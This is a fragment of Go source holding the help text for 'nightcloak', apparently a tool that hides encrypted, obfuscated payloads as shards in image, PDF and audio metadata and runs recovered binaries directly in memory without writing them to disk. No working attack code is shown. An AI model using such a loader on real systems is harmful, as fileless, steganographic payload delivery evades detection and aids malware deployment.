        -n <total>            Total shards to distribute (default: 6)
        -k <min>              Minimum shards required for recovery (default: 4)
        -p, --password <pw>   Encryption password (or NIGHT_PASSWORD)

        Examples:
          nightcloak split secret.bin ./media/ -n 6 -k 4 -p mypass
          nightcloak split secret.bin ./media/ -p mypass

    gather <search_dir> [flags]
        Beacon-scan → Group by PayloadID → RS reconstruct → Decrypt → Output.

        -p, --password <pw>   Decryption password (or NIGHT_PASSWORD)
        -o, --output <path>   Write recovered payload to path (default: stdout)

        Examples:
          nightcloak gather ./media/ -p mypass -o recovered.bin
          nightcloak gather ./media/ -p mypass

    scan <dir> [flags]
        Recursively walk dir and print paths of all beacon-matching files.

        -p, --password <pw>   Password used to derive the beacon (or NIGHT_PASSWORD)

        Examples:
          nightcloak scan ./media/ -p mypass

    exec <carrier> [-- <args...>] [flags]
        Extract → Decrypt → De-obfuscate → Direct in-memory execution.
        The binary never touches the disk (Linux only).

        -p, --password <pw>   Decryption password (prompted if omitted)

        Examples:
          nightcloak exec carrier.pdf -p mypass
          nightcloak exec carrier.pdf -p mypass -- -a -l

    inspect <file>
        Show all metadata tags from a file (no decryption).

        Examples:
          nightcloak inspect photo.jpg

    dump <carrier> [-p password]
        Extract and decrypt to stdout without de-obfuscation.
        Useful for debugging or piping raw decrypted data.

        Examples:
          nightcloak dump photo.jpg -p mypass
          nightcloak dump photo.jpg -p mypass | file -

    obfuscate <string|->
        Pure nightmare encoding (hex → base82). No encryption.

        Examples:
          nightcloak obfuscate "hello world"
          echo "hello" | nightcloak obfuscate -

    deobfuscate <string|->
        Reverse nightmare encoding.

        Examples:
          nightcloak deobfuscate "Awt7AGMwAzZ7Mt=="
          echo "Awt7AGMwAzZ7Mt==" | nightcloak deobfuscate -

  Requires: exiftool (most formats), ffmpeg/ffprobe (mp3/avi/ogg)`)
}

func log(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "  [*] "+format+"\n", args...)
}

func die(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "  [!] Error: "+format+"\n", args...)
	os.Exit(1)
}
